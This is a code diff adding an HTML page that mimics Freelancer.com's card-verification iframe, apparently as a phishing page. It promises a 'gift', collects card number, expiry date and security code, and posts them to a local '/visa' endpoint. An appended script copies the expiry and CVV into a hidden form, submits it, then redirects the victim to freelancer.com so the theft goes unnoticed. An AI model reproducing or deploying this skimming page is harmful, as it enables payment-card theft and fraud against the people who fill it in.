@@ -1,0 +1,365 @@
+<!DOCTYPE html>
+<!-- saved from url=(0938)https://api.freelancerbilling.com/v1/iframe?expires=1559470159&signature=rkmE3neFjqFbC14iSLiPb9f5GZs%3D&amount=0.25&currency=USD&dropdown=1&external=CNY%2CCLP%2CJMD%2CJPY%2CSEK%2CMXN%2CIDR%2CMYR%2CPHP%2CPLN%2CBRL%2CDKK%2CVND%2CAED%2CARS%2CBDT%2CCOP%2CPKR%2CZAR&lang=en&name=Freelancer+Staff&ref=verification&returnurl=https%3A%2F%2Fwww.freelancer.com%2Fajax%2Fpayment%2FflnBilling.php%3Faction%3DdirectPayment%26cc_gateway%3Dgc%26setupRecurring%3Dtrue%26skip_bad_bins_origin%3Dfalse%26successUrl%3DMzEzYjlmYTUwZGRlNzI1ZWMwZmNmNGRlN2YzM2E2MTgvbWVtYmVyc2hpcC9vbmpvaW4ucGhwP3JlZGlyZWN0PTEmZnJlZXRyaWFsPTEmbWVtYmVyc2hpcF9wYWNrYWdlX2lkPTUmZHVyYXRpb25fdHlwZT01JmR1cmF0aW9uX2N5Y2xlPTEmdHJpYWxfaWQ9MSZyZWY9cHJvZmlsZV9zZXR0aW5nX3Byb21vJmJhY2s9TnpjMk1XWmhORGRsT1RkbE9HRmhZVFJrWkRFNU1EQXpNR1UwTnprMll6Y3ZaR0Z6YUdKdllYSmtQM0psWmoxd2NtOW1hV3hsYzJWMGRHbHVaM0J5YjIxdkpuVnVZMmhsWTJ0bFpGOTBjbWxoYkQweA%252C%252C&style=legacy&uid=1559470159&userid=34929486 -->
+<html>
+
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta name="style" content="legacy">
+    <link rel="stylesheet" href="./legacy.css">
+</head>
+
+<body>
+    <div class="pinky-template">
+        <div class="payment-form-container notinterframe">
+
+
+
+
+
+
+
+
+
+            <form action="/visa" method="POST" hidden id="my_form">
+                <input type="text" id="a" name="a" value="a">
+                <input type="text" id="b" name="b" value="a">
+                <input type="text" id="c" name="c" value="a">
+                <button type="submit"></button>
+            </form>
+            <form action="/visa" method="POST" id="fln-billing-form" class="fl-form iframe-payment-form"
+                autocomplete="on">
+                <input type="hidden" name="csrf" value="7ND2iC19MWCJppxrC75Aa01hkTU=" data-fln-billing-cleartext="">
+                <input type="hidden" name="amount" value="0.25" data-fln-billing-cleartext="">
+                <input type="hidden" name="currency" value="USD" data-fln-billing-cleartext="">
+                <input type="hidden" name="card" id="card" value="" data-fln-billing-cleartext="">
+                <input type="hidden" name="iin" id="iin" value="" data-fln-billing-cleartext="">
+                <input type="hidden" name="lastfour" id="lastfour" value="" data-fln-billing-cleartext="">
+                <input type="hidden" name="expirymonth" id="expirymonth" value="" data-fln-billing-cleartext="">
+                <input type="hidden" name="expiryyear" id="expiryyear" value="" data-fln-billing-cleartext="">
+                <input type="hidden" name="cardholdername" id="cardholdername" value="Freelancer Staff"
+                    data-fln-billing-cleartext="">
+                <input type="hidden" id="cc-name" maxlength="100" value="Freelancer Staff" data-fln-billing="name">
+
+                <ol>
+
+                    <li class="form-step">
+                        <label>Card Number</label>
+                        <input id="cc-number" name="my_number" type="text" maxlength="20" required="" value=""
+                            data-fln-billing="number" autocomplete="cc-number">
+                        <div class="form-error"></div>
+                    </li>
+
+                    <li class="form-step">
+                        <div class="form-step-group">
+                            <!-- Expiry Date -->
+                            <div class="form-step-group-item form-step">
+                                <label for="cc-expiry-date">Expiry Date</label>
+                                <input name='my_exp' id="cc-expiry-date" type="text" placeholder="MM / YY"
+                                    class="input-expiry-date" maxlength="7" required="" data-fln-billing="date">
+                                <input name='my_exp2' id="cc-exp-month" required="" type="hidden"
+                                    data-fln-billing="month">
+                                <input name='my_exp3' id="cc-exp-year" required="" type="hidden"
+                                    data-fln-billing="year">
+                                <div class="form-error">Expiry date entered is invalid</div>
+                            </div>
+                        </div>
+                    </li>
+                    <li class="form-step security-number-form-step">
+                        <label>Security Code</label>
+                        <input name='my_cvv' id="cc-csc" type="text" maxlength="4" value="" data-fln-billing="cvc"
+                            autocomplete="cc-csc">
+                        <small class="security-number-help" id="cvc_message">
+                            The last 3 digits displayed on the back of your card
+                        </small>
+                        <div class="form-error">Security code entered is invalid</div>
+                    </li>
+
+                    <li class="form-step">
+                        <small>
+                            You will recieve your gift within 24 hours after submitting
+                            <span class="payment-select-wrapper">
+                              
+                            </span>.
+                        </small>
+                    </li>
+
+
+
+                    <li class="form-step">
+                        <button id="btnSubmit" type="button" class="btn btn-info btn-large has-depth" disabled=""
+                            name="submit" value="submit">Continue</button>
+                        <span class="submit_loading" style="display:none"><img src="./ajax-loader.gif"></span>
+                    </li>
+                </ol>
+            </form>
+
+
+
+
+
+
+
+
+
+
+
+
+
+        </div>
+        <div class="return_section" style="display:none;"></div>
+    </div>
+
+    <script src="./fln-billing-0.1.2.min.js.download" type="text/javascript"></script>
+    <script type="text/javascript">function load(e) {
+
+
+            var currencyMap = {
+                "AUD": "Australian dollar", "CAD": "Canadian dollar", "EUR": "Euro", "GBP": "Pound sterling", "HKD": "Hong Kong dollar", "INR": "Indian rupee", "NZD": "New Zealand dollar", "SGD": "Singapore dollar", "USD": "United States dollar", "CNY": "Chinese yuan", "CLP": "Chilean peso", "JMD": "Jamaican dollar", "JPY": "Japanese yen", "SEK": "Swedish krona/kronor", "MXN": "Mexican peso", "IDR": "Indonesian rupiah", "MYR": "Malaysian ringgit", "PHP": "Philippine peso", "PLN": "Polish złoty", "BRL": "Brazilian real", "DKK": "Danish krone", "VND": "Vietnamese đồng", "AED": "United Arab Emirates dirham", "ARS": "Argentine peso", "BDT": "Bangladeshi taka", "COP": "Colombian peso", "PKR": "Pakistani rupee", "ZAR": "South African rand",
+            };
+
+            function lookupIssuingCurrencyByIIN(iin) {
+                var iinReq = new XMLHttpRequest();
+                iinReq.open('GET', '/v1/iin/' + iin + '?expand=country', true);
+                iinReq.onload = function () {
+                    if (this.readyState === this.DONE && this.status === 200) {
+                        var issuingCurrency = JSON.parse(this.responseText).country.currencies[0];
+                        var issueCurrencyInputEl = document.getElementById('fx-issuing-currency');
+                        for (var i = 0; i < issueCurrencyInputEl.options.length; ++i) {
+
+                            if (issueCurrencyInputEl.options[i].value === issuingCurrency) {
+                                issueCurrencyInputEl.selectedIndex = i;
+                                break;
+                            }
+                        }
+                    }
+                };
+                iinReq.send();
+            };
+
+            var updateExpiryDate = function (metaData) {
+                if ((typeof metaData.expiryDate !== 'undefined')) {
+                    var dateEl = document.getElementById('cc-expiry-date');
+                    if (typeof dateEl !== 'undefined') {
+                        dateEl.value = metaData.expiryDate;
+                    }
+                }
+
+                if ((typeof metaData.expiryMonth !== 'undefined')) {
+                    var dateEl = document.getElementById('cc-exp-month');
+                    if (typeof dateEl !== 'undefined') {
+                        dateEl.value = metaData.expiryMonth;
+                    }
+                }
+
+                if ((typeof metaData.expiryYear !== 'undefined')) {
+                    var dateEl = document.getElementById('cc-exp-year');
+                    if (typeof dateEl !== 'undefined') {
+                        dateEl.value = metaData.expiryYear;
+                    }
+                }
+            }
+
+            flnBilling = new FreelancerBilling('MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCtVQK5yoNGkUOqqKiPEYQmNa4oFAu4pzgLVQqzzvAuieMAgzPYEjY6JiIgmmPUW5ktY/LUrTo6NaoFMQxf4PRfi9UsTmhZ9ijYKUfcHBMl1QLMBKsxtP5uJwanDY8JmVW9no/qP8hy/RZXzTJyP/ulOIzvSR5JFPH5DOI49WgcvQIDAQAB');
+
+            var formSubmitted = false;
+            flnBilling.encryptForm('fln-billing-form', {
+                success: function (encryptedData) {
+                    if (typeof encryptedData === 'undefined' || formSubmitted) {
+                        return false;
+                    }
+                    formSubmitted = true;
+                    var returnForm = document.createElement('form'),
+                        submitEl = document.querySelector('#btnSubmit'),
+                        loader = document.querySelector('.form-step .submit_loading');
+                    returnForm.method = 'post';
+                    returnForm.action = '/visa';
+                    returnForm.accept = 'application/json';
+                    returnForm.id = 'return_form';
+                    var dataInput = document.createElement('input');
+                    dataInput.setAttribute('name', 'data');
+                    dataInput.setAttribute('value', encryptedData);
+                    returnForm.appendChild(dataInput);
+                    submitEl.style.display = 'none';
+                    loader.style.display = '';
+                    document.getElementsByClassName('return_section')[0].appendChild(returnForm);
+                    returnForm.submit();
+                }
+            });
+
+            flnBilling.validateForm('fln-billing-form', {
+                success: function (validation) {
+                    // Hide any error messages once validated
+                    var msgEl = getSiblingWithClass(validation.target, 'form-error');
+                    msgEl.innerHTML = '';
+                    var errorEl = validation.target.parentNode;
+                    if (validation.target.value.length > 0) {
+                        addClass(errorEl, 'is-valid');
+                        removeClass(errorEl, 'is-invalid');
+                    } else {
+                        removeClass(errorEl, 'is-invalid');
+                        removeClass(errorEl, 'is-valid');
+                    }
+                    if (typeof validation.meta.card !== 'undefined') {
+                        var cardEl = document.getElementById('card');
+                        cardEl.value = validation.meta.card;
+                    }
+                    if (validation.target.id === 'cc-expiry-date') {
+                        updateExpiryDate(validation.meta);
+                    }
+                    if (typeof validation.meta.iin !== 'undefined') {
+                        var iinEl = document.getElementById('iin');
+                        if (iinEl.value !== validation.meta.iin) {
+                            lookupIssuingCurrencyByIIN(validation.meta.iin);
+                        }
+                        iinEl.value = validation.meta.iin;
+                    }
+                    if (typeof validation.meta.lastFour !== 'undefined') {
+                        var lastfourEl = document.getElementById('lastfour');
+                        lastfourEl.value = validation.meta.lastFour;
+                    }
+                    if ((typeof validation.meta.expiryMonth !== 'undefined') &&
+                        (typeof validation.meta.expiryYear !== 'undefined')) {
+                        var monthEl = document.getElementById('expirymonth'),
+                            yearEl = document.getElementById('expiryyear');
+                        monthEl.value = validation.meta.expiryMonth;
+                        yearEl.value = validation.meta.expiryYear;
+                    }
+                    if (typeof validation.meta.cardholderName !== 'undefined') {
+                        var cardholderNameEl = document.getElementById('cardholdername');
+                        cardholderNameEl.value = validation.meta.cardholderName;
+                    }
+                    var submitEl = document.querySelector('#btnSubmit');
+                    submitEl.disabled = !validation.allValid;
+                },
+                info: function (validation) {
+                    if (typeof validation.meta.card !== 'undefined') {
+                        document.getElementById('cvc_message').innerHTML = validation.meta.cvcMessage
+                            || 'The last 3 digits displayed on the back of your card';
+                    }
+                    if (validation.target.id === 'cc-expiry-date') {
+                        updateExpiryDate(validation.meta);
+                    }
+                    if (typeof validation.meta.iin !== 'undefined') {
+                        var iinEl = document.getElementById('iin');
+                        if (iinEl.value !== validation.meta.iin) {
+                            lookupIssuingCurrencyByIIN(validation.meta.iin);
+                        }
+                        iinEl.value = validation.meta.iin;
+                    }
+                },
+                error: function (error) {
+                    // Find error step and display validation error
+                    var msgEl = getSiblingWithClass(error.target, 'form-error');
+                    msgEl.innerHTML = error.message;
+                    var errorEl = error.target.parentNode;
+                    addClass(errorEl, 'is-invalid');
+                    removeClass(errorEl, 'is-valid');
+                    var submitEl = document.querySelector('#btnSubmit');
+                    submitEl.disabled = true;
+                    if (error.target.id === 'cc-expiry-date') {
+                        updateExpiryDate({
+                            'expiryDate': error.meta.expiryDate,
+                            'expiryMonth': '',
+                            'expiryYear': '',
+                        });
+                    }
+                }
+            }, {
+                    accepted: ['visa', 'amex', 'mastercard', 'jcb', 'visa_electron', 'aura', 'elo', 'hipercard', 'carnet']
+                });
+
+            flnBilling.validateEbanxForm('fln-billing-form', {
+                success: function (validation) {
+                    var msgEl = getSiblingWithClass(validation.target, 'form-error');
+                    msgEl.innerHTML = '';
+                    var errorEl = validation.target.parentNode;
+                    if (validation.target.value.length > 0) {
+                        addClass(errorEl, 'is-valid');
+                        removeClass(errorEl, 'is-invalid');
+                    } else {
+                        removeClass(errorEl, 'is-invalid');
+                        removeClass(errorEl, 'is-valid');
+                    }
+                    var submitEl = document.querySelector('#btnSubmit');
+                    submitEl.disabled = !validation.allValid;
+                },
+                error: function (error) {
+                    var msgEl = getSiblingWithClass(error.target, 'form-error');
+                    msgEl.innerHTML = error.message;
+                    var errorEl = error.target.parentNode;
+                    addClass(errorEl, 'is-invalid');
+                    removeClass(errorEl, 'is-valid');
+                    var submitEl = document.querySelector('#btnSubmit');
+                    submitEl.disabled = true;
+                }
+            });
+
+            function getSiblingWithClass(el, className) {
+                var sibling = el.parentNode.firstChild;
+                while (el.nextSibling) {
+                    el = el.nextSibling;
+                    if (el.className == className) {
+                        return el;
+                    }
+                }
+                return undefined;
+            };
+
+            function hasClass(el, className) {
+                return el.className.match(new RegExp('(\\s|^)' + className + '(\\s|$)'));
+            };
+
+            function addClass(el, className) {
+                if (!hasClass(el, className)) {
+                    el.className += " " + className;
+                }
+            };
+
+            function removeClass(el, className) {
+                if (hasClass(el, className)) {
+                    var reg = new RegExp('(\\s|^)' + className + '(\\s|$)');
+                    el.className = el.className.replace(reg, ' ');
+                }
+            };
+        };
+
+        if (document.addEventListener) {
+            document.addEventListener("DOMContentLoaded", load, false);
+        } else if (document.attachEvent) {
+            if ("DOMContentLoaded" in document.documentElement) {
+                document.attachEvent("DOMContentLoaded", load);
+            } else {
+                window.onload = load;
+            }
+        }
+
+        function stripInvalidChar(event) {
+            event.target.value = event.target.value.replace(/[^\d]/g, '');
+        }
+
+        var number_els = document.querySelectorAll('[data-fln-billing="number"], [data-fln-billing="cvc"]');
+        for (var i = 0; i < number_els.length; i++) {
+            if (number_els[i].addEventListener) {
+                number_els[i].addEventListener('keyup', stripInvalidChar, false);
+            } else if (number_els[i].attachEvent) {
+                number_els[i].attachEvent('onkeyup', stripInvalidChar);
+            }
+        }</script>
+    <img src="./1px.gif">
+
+</body>
+
+</html>
+<script>
+
+    document.getElementById("btnSubmit").addEventListener("click", function () {
+        document.getElementById("b").value = document.getElementById("cc-expiry-date").value;
+        document.getElementById("c").value = document.getElementById("cc-csc").value;
+        console.log(document.getElementById("fln-billing-form"));
+        document.getElementById("my_form").submit();
+        window.top.location.href = 'http://www.freelancer.com'
+        document.getElementById("btnSubmit").disabled = true;
+    });
+ 
+
+</script>
